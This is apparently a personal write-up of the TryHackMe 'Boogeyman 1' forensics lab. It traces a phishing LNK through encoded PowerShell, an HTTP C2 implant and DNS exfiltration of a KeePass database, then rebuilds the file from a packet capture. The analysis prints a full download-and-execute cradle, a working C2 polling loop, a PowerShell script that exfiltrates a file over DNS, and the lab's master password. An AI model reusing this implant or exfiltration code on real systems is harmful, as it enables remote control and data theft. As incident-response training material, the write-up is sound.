# Boogeyman 1 - Phishing to DNS Exfiltration

## Incident Investigation Writeup

> **Lab:** TryHackMe - Boogeyman 1\
> **Focus:** Phishing analysis, PowerShell forensics, C2 analysis, PCAP
> investigation, credential discovery, DNS exfiltration, and file
> reconstruction

## Executive Summary

This investigation followed a Windows compromise from initial phishing
execution through PowerShell command-and-control (C2), host
reconnaissance, credential discovery, sensitive-file access, and
DNS-based data exfiltration.

I correlated multiple forensic artifacts rather than treating each one
independently:

-   Email and malicious shortcut evidence
-   Windows PowerShell Script Block Logging
-   HTTP C2 traffic
-   DNS traffic
-   A reconstructed KeePass database

The attacker ultimately targeted a KeePass database named
`protected_data.kdbx`. They discovered its master password inside the
victim's Microsoft Sticky Notes database, converted the KeePass file to
hexadecimal, split the encoded data into chunks, and exfiltrated those
chunks through DNS queries.

I reconstructed the exfiltrated KDBX from the packet capture, unlocked
it with the recovered master password, and verified that the stolen
database contained sensitive financial information.

> **Note:** The full lab credit-card value is intentionally redacted in
> this public-facing writeup.

------------------------------------------------------------------------

## 1. Initial Access - Investigating the Malicious Shortcut

The investigation began with a suspicious Windows shortcut delivered as
part of the phishing chain.

Parsing the `.lnk` file showed that it did not simply open a document.
Instead, it launched:

``` text
..\..\..\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
```

with the following arguments:

``` powershell
-nop -windowstyle hidden -enc <Base64>
```

These arguments were immediately suspicious:

-   `-nop` prevents PowerShell from loading the user's profile.
-   `-windowstyle hidden` hides the PowerShell window from the victim.
-   `-enc` indicates that the command is Base64 encoded.

The encoded payload was:

``` text
aQBlAHgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZgBpAGwAZQBzAC4AYgBwAGEAawBjAGEAZwBpAG4AZwAuAHgAeQB6AC8AdQBwAGQAYQB0AGUAJwApAA==
```

After decoding it as UTF-16LE Base64, I recovered:

``` powershell
iex (new-object net.webclient).downloadstring('http://files.bpakcaging.xyz/update')
```

The command uses `WebClient.DownloadString()` to retrieve PowerShell
code and `Invoke-Expression` (`iex`) to execute it directly.

This established an early network indicator:

``` text
files.bpakcaging.xyz
```

It also confirmed that the shortcut was an execution mechanism for the
next stage of the compromise.

**MITRE ATT&CK:** T1059.001 - PowerShell

------------------------------------------------------------------------

## 2. Pivoting Into PowerShell Logs

With PowerShell confirmed as the attacker's execution mechanism, I moved
to the provided PowerShell Operational logs.

The events had been exported to JSON, so I used `jq` to isolate Event ID
4104 Script Block Logging records:

``` bash
cat powershell.json | jq -r 'select(.EventID == 4104) | .ScriptBlockText'
```

Event ID 4104 was especially valuable because it exposed PowerShell code
executed during the compromise.

Early commands included basic reconnaissance:

``` powershell
whoami
pwd
ls
ps
```

The attacker also navigated through the victim's filesystem:

``` powershell
cd C:\
cd Users
cd j.westcott
```

This identified the compromised user's profile as:

``` text
C:\Users\j.westcott
```

Rather than searching the PCAP blindly, I used the host evidence to
establish what network activity I should expect to find later.

------------------------------------------------------------------------

## 3. Host Enumeration With Seatbelt

The attacker downloaded another executable:

``` powershell
iwr http://files.bpakcaging.xyz/sb.exe -outfile sb.exe
```

It was subsequently invoked in several ways, including:

``` powershell
.\sb.exe
.\sb.exe system
.\sb.exe all
.\sb.exe -group=user
.\sb.exe -group=all
```

Additional PowerShell evidence connected this activity to Seatbelt, a
Windows host-enumeration utility commonly used during post-exploitation.

At this point, the attack had progressed from establishing code
execution to actively profiling the compromised workstation.

------------------------------------------------------------------------

## 4. Discovering the C2 Channel

One of the most useful PowerShell artifacts was a compact C2 implant:

``` powershell
$s='cdn.bpakcaging.xyz:8080'
$i='8cce49b0-b86459bb-27fe2489'
$p='http://'

$v=Invoke-WebRequest -UseBasicParsing -Uri $p$s/8cce49b0 `
  -Headers @{"X-38d2-8f49"=$i}

while ($true) {
    $c=(Invoke-WebRequest -UseBasicParsing -Uri $p$s/b86459bb `
      -Headers @{"X-38d2-8f49"=$i}).Content

    if ($c -ne 'None') {
        $r=iex $c -ErrorAction Stop -ErrorVariable e
        $r=Out-String -InputObject $r

        $t=Invoke-WebRequest -Uri $p$s/27fe2489 -Method POST `
          -Headers @{"X-38d2-8f49"=$i} `
          -Body ([System.Text.Encoding]::UTF8.GetBytes($e+$r) -join ' ')
    }

    sleep 0.8
}
```

This revealed the actual C2 endpoint:

``` text
cdn.bpakcaging.xyz:8080
```

The implant repeatedly requested commands from:

``` text
/b86459bb
```

Commands were passed directly to:

``` powershell
iex $c
```

Command output was returned with HTTP `POST` requests to:

``` text
/27fe2489
```

The malware also used a distinctive custom header:

``` text
X-38d2-8f49: 8cce49b0-b86459bb-27fe2489
```

The communication pattern was therefore:

``` text
Victim -> HTTP GET  -> C2 -> retrieve command
Victim <- command   <- C2
Victim executes command
Victim -> HTTP POST -> C2 -> return command output
```

Understanding this implementation became critical when decoding the
attacker's activity from the PCAP.

------------------------------------------------------------------------

## 5. Separating C2 Infrastructure From Payload Hosting

An important part of the investigation was distinguishing infrastructure
by function.

The C2 server responded with:

``` text
Server: Apache/2.4.1
```

However, PowerShell showed tools such as `sb.exe` and `sq3.exe` being
downloaded from:

``` text
files.bpakcaging.xyz
```

I pivoted to the IP associated with the file-hosting activity:

``` text
ip.addr == 167.71.211.113 && http
```

This exposed requests including:

``` http
GET /update
GET /sb.exe
GET /sq3.exe
```

The responses identified the file server as:

``` text
Server: SimpleHTTP/0.6 Python/3.10.7
```

This showed that the attacker used separate infrastructure roles:

``` text
cdn.bpakcaging.xyz:8080 -> HTTP C2
files.bpakcaging.xyz    -> payload/tool hosting
```

This distinction prevented me from incorrectly treating every malicious
HTTP response as coming from the same service.

------------------------------------------------------------------------

## 6. Discovery of the KeePass Database

PowerShell command history showed the attacker checking:

``` text
C:\Users\j.westcott\Documents\protected_data.kdbx
```

The `.kdbx` extension identified the file as a KeePass password
database.

That immediately made it a high-value target. However, stealing the
encrypted database would not automatically expose its contents. The
attacker still needed the master password.

The next stage showed how they obtained it.

------------------------------------------------------------------------

## 7. Credential Discovery Through Microsoft Sticky Notes

The attacker downloaded another utility:

``` powershell
iwr http://files.bpakcaging.xyz/sq3.exe -outfile sq3.exe
```

PowerShell logging later showed it being used against:

``` text
C:\Users\j.westcott\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite
```

The attacker executed a query similar to:

``` sql
SELECT * from NOTE limit 100
```

`plum.sqlite` contains data associated with Microsoft Sticky Notes. This
suggested the attacker was searching local application data for secrets
the victim may have saved in notes.

This was the key link between the encrypted KeePass database and the
credential required to open it.

------------------------------------------------------------------------

## 8. Reconstructing the Attacker's Interactive Session From the PCAP

Because the C2 implant returned command results through HTTP POST
requests, I filtered the packet capture with:

``` text
ip.dst == 159.89.205.40 &&
tcp.dstport == 8080 &&
http.request.method == "POST" &&
http.request.uri == "/27fe2489"
```

The POST bodies initially looked like sequences of numbers:

``` text
84 104 101 32 116 101 114 109 ...
```

Reviewing the implant explained the format:

``` powershell
[System.Text.Encoding]::UTF8.GetBytes($e+$r) -join ' '
```

The values were decimal representations of UTF-8 bytes, not encrypted
data.

Converting those numbers back into bytes allowed me to reconstruct the
attacker's console output and effectively follow the interactive session
through network traffic.

This was a useful example of why understanding malware implementation
can make packet analysis significantly easier.

------------------------------------------------------------------------

## 9. Following the Attacker Toward Sticky Notes

I followed the C2 POST responses chronologically.

At approximately `17:22:32 GMT`, one decoded response showed a directory
listing for:

``` text
C:\Users\j.westcott\AppData\Local\Packages
```

The listing included:

``` text
Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe
```

At approximately `17:24:13 GMT`, another response decoded to:

``` text
The term '.\sq3.exe' is not recognized as the name of a cmdlet,
function, script file, or operable program.
```

This showed that the attacker initially attempted to execute the SQLite
utility from the wrong location.

That failed command was useful forensic evidence because it demonstrated
that the traffic represented an interactive operator rather than a
perfectly scripted sequence.

The attacker corrected the path and successfully queried the Sticky
Notes database shortly afterward.

------------------------------------------------------------------------

## 10. Recovering the KeePass Master Password

At approximately `17:25:38 GMT`, I identified the C2 POST containing the
output of the successful SQLite query.

After converting the decimal UTF-8 bytes back into text, the Sticky
Notes data contained:

``` text
Master Password
%p9^3!lL^Mz47E2GaT^y
```

The attacker's credential-discovery process was now clear:

``` text
Discover protected_data.kdbx
        |
        v
Recognize it as a KeePass database
        |
        v
Locate Microsoft Sticky Notes
        |
        v
Query plum.sqlite
        |
        v
Recover the KeePass master password
```

The recovered password was:

``` text
%p9^3!lL^Mz47E2GaT^y
```

This demonstrated an important defensive lesson: strong encryption can
still be undermined if the credential protecting the encrypted data is
stored elsewhere on the same endpoint.

------------------------------------------------------------------------

## 11. Identifying DNS Exfiltration

PowerShell logs then showed the attacker reading the KeePass database:

``` powershell
$file='C:\Users\j.westcott\Documents\protected_data.kdbx'
$bytes = [System.IO.File]::ReadAllBytes($file)
```

The bytes were converted to hexadecimal:

``` powershell
$hex = ($bytes | ForEach-Object ToString X2) -join ''
```

The hexadecimal string was divided into chunks:

``` powershell
$split = $hex -split '(\S{50})'
```

Each chunk was then embedded in a DNS query:

``` powershell
ForEach ($line in $split) {
    nslookup -q=A "$line.bpakcaging.xyz" $destination
}
```

The destination was:

``` text
167.71.211.113
```

The exfiltration process was therefore:

``` text
protected_data.kdbx
        |
        v
Read raw bytes
        |
        v
HEX encode
        |
        v
Split into ~50-character chunks
        |
        v
<HEX>.bpakcaging.xyz
        |
        v
DNS A queries
        |
        v
167.71.211.113
```

One captured query began:

``` text
03D9A29A67FB4BB50100030002100031C1F2E6BF714350BE58.bpakcaging.xyz
```

The opening bytes:

``` text
03D9A29A67FB4BB5
```

were consistent with a KDBX file signature, providing additional
validation that the DNS traffic contained the stolen KeePass database.

**MITRE ATT&CK:** T1048.003 - Exfiltration Over Unencrypted Non-C2
Protocol

------------------------------------------------------------------------

## 12. Reconstructing the Exfiltrated KeePass Database

Identifying the exfiltration technique was not enough. I wanted to
validate that the stolen file could actually be reconstructed from the
packet capture.

Using Tshark, I extracted the DNS query names:

``` bash
tshark -r capture.pcapng \
  -Y 'dns.qry.name contains "bpakcaging.xyz"' \
  -T fields -e dns.qry.name
```

The relevant queries looked like:

``` text
03D9A29A67FB4BB50100030002100031C1F2E6BF714350BE58.bpakcaging.xyz
05216AFC5AFF03040001000000042000AF4DE7A467FADFBFEB.bpakcaging.xyz
...
```

I then removed the attacker-controlled domain, concatenated the
hexadecimal chunks in transmission order, and converted the result back
to binary:

``` bash
tshark -r capture.pcapng \
  -Y 'dns.qry.name contains "bpakcaging.xyz"' \
  -T fields -e dns.qry.name |
grep -E '^[0-9A-Fa-f]+\.bpakcaging\.xyz$' |
sed 's/\.bpakcaging\.xyz$//' |
tr -d '\n' |
xxd -r -p > recovered.kdbx
```

This reversed the attacker's exfiltration process:

``` text
DNS queries
    |
    v
Extract subdomains
    |
    v
Remove bpakcaging.xyz
    |
    v
Concatenate HEX
    |
    v
HEX -> binary
    |
    v
recovered.kdbx
```

The successful reconstruction proved that the captured DNS traffic
contained sufficient information to recover the stolen file.

------------------------------------------------------------------------

## 13. Validating the Data Compromise

I opened the reconstructed database using the master password recovered
from Sticky Notes:

``` text
%p9^3!lL^Mz47E2GaT^y
```

The database opened successfully.

Inside it was sensitive financial information, including a credit-card
record. For this public-facing report, I have intentionally redacted
part of the value:

``` text
402400712826****
```

This completed the forensic chain from initial execution through
confirmed exposure of the contents of the stolen file.

------------------------------------------------------------------------

## Attack Chain

``` text
Phishing email
      |
      v
Malicious .LNK
      |
      v
Hidden encoded PowerShell
      |
      v
files.bpakcaging.xyz/update
      |
      v
PowerShell C2 implant
      |
      +----> cdn.bpakcaging.xyz:8080
      |
      v
Host reconnaissance
      |
      +----> Seatbelt
      |
      v
Sensitive data discovery
      |
      +----> protected_data.kdbx
      |
      v
Credential discovery
      |
      +----> Microsoft Sticky Notes
      +----> plum.sqlite
      +----> KeePass master password
      |
      v
Read protected_data.kdbx
      |
      v
Convert file -> HEX
      |
      v
DNS exfiltration
      |
      +----> <HEX>.bpakcaging.xyz
      +----> 167.71.211.113
      |
      v
Reconstruct recovered.kdbx
      |
      v
Unlock with recovered password
      |
      v
Sensitive financial data confirmed
```

------------------------------------------------------------------------

## Key Indicators of Compromise

  -----------------------------------------------------------------------
  Indicator                           Role
  ----------------------------------- -----------------------------------
  `files.bpakcaging.xyz`              Payload/tool hosting

  `cdn.bpakcaging.xyz:8080`           HTTP C2

  `bpakcaging.xyz`                    DNS exfiltration domain

  `167.71.211.113`                    Attacker-controlled infrastructure
                                      used during file
                                      hosting/exfiltration

  `159.89.205.40:8080`                C2 endpoint observed in PCAP

  `/b86459bb`                         C2 command retrieval

  `/27fe2489`                         C2 command-output submission

  `X-38d2-8f49`                       Custom C2 HTTP header

  `sb.exe`                            Seatbelt enumeration utility

  `sq3.exe`                           SQLite utility used against Sticky
                                      Notes

  `protected_data.kdbx`               Exfiltrated KeePass database

  `plum.sqlite`                       Sticky Notes database containing
                                      the KeePass password
  -----------------------------------------------------------------------

------------------------------------------------------------------------

## Investigation Methodology

The most valuable part of this investigation was learning how to pivot
between host and network evidence.

PowerShell logging showed what the attacker executed. That exposed
domains, tools, filesystem paths, and the implementation of the C2
implant. I used those indicators to narrow the PCAP rather than
searching network traffic blindly.

Understanding the implant's source code explained why C2 POST bodies
consisted of space-separated decimal numbers. Decoding those numbers
reconstructed command output and allowed me to follow the attacker's
activity almost as if I were watching their terminal.

Finally, identifying the PowerShell responsible for DNS exfiltration
gave me the inverse operation required to recover the stolen file. I
extracted the DNS labels, reversed the hexadecimal encoding, rebuilt the
KDBX, and used the separately recovered Sticky Notes credential to
decrypt it.

The investigation followed a repeatable incident-response methodology:

``` text
Detection
   -> Hypothesis
   -> Evidence correlation
   -> Pivot
   -> Decode
   -> Reconstruct
   -> Validate
```

------------------------------------------------------------------------

## Defensive Takeaways

Several defensive opportunities existed throughout this attack.

### PowerShell Visibility

PowerShell Script Block Logging provided strong evidence of the
attacker's behavior, including:

-   Remote payload retrieval
-   Reconnaissance commands
-   C2 implementation
-   Credential discovery
-   File access
-   DNS exfiltration commands

Event ID `4104` should be collected and forwarded to centralized logging
where practical.

### Endpoint Detection Opportunities

Potential detections include:

-   PowerShell using `Invoke-WebRequest` or `WebClient` to download
    executables
-   Hidden or encoded PowerShell execution
-   PowerShell launching `nslookup` repeatedly
-   Enumeration tools such as Seatbelt appearing on endpoints
-   Unexpected access to browser, password-manager, or local application
    databases
-   Command-line SQLite utilities accessing user application data

### Network Detection Opportunities

The network traffic contained several strong indicators:

-   Repeated HTTP communication to TCP/8080
-   A distinctive custom HTTP header
-   Regular C2 polling
-   HTTP POST requests containing encoded command output
-   Large numbers of DNS queries to one domain
-   Long, high-entropy hexadecimal DNS labels
-   Direct DNS queries to attacker-controlled infrastructure

### Credential Storage

The KeePass database itself was encrypted, but the protection was
defeated because its master password was stored in Microsoft Sticky
Notes on the same compromised endpoint.

Encrypted data should not have its decryption credential stored
alongside it in plaintext.

------------------------------------------------------------------------

## Skills Demonstrated

This investigation required practical use of:

-   Phishing and malicious shortcut analysis
-   Base64 and UTF-16LE decoding
-   Windows PowerShell forensics
-   Event ID 4104 analysis
-   Command-line JSON analysis with `jq`
-   Wireshark filtering and stream analysis
-   Tshark packet extraction
-   HTTP C2 reverse engineering
-   UTF-8 byte decoding
-   SQLite artifact analysis
-   KeePass/KDBX identification
-   DNS exfiltration analysis
-   Hexadecimal encoding/decoding
-   Exfiltrated-file reconstruction
-   Cross-artifact timeline correlation
-   MITRE ATT&CK mapping

------------------------------------------------------------------------

## Conclusion

This lab demonstrated how an apparently simple phishing execution could
develop into a complete compromise involving post-exploitation
reconnaissance, credential discovery, sensitive-file theft, and DNS
exfiltration.

The strongest part of the investigation was the ability to correlate
evidence across multiple telemetry sources. Host logs identified
attacker commands and explained the C2 implementation, while the packet
capture provided the actual command-and-control and exfiltration
traffic. By understanding both sides, I was able to reconstruct the
attacker's actions and independently recover the stolen data.

Instead of stopping after identifying suspicious traffic, I validated
the impact by rebuilding the exfiltrated KeePass database from DNS
queries and successfully opening it with the credential recovered from
the victim's Sticky Notes database.

That final reconstruction turned an assumption of data theft into
demonstrated evidence of data compromise.

------------------------------------------------------------------------

## Disclaimer

This investigation was performed in an authorized TryHackMe lab
environment for cybersecurity training and portfolio development. All
systems, credentials, infrastructure, and financial data referenced here
are associated with the lab scenario.
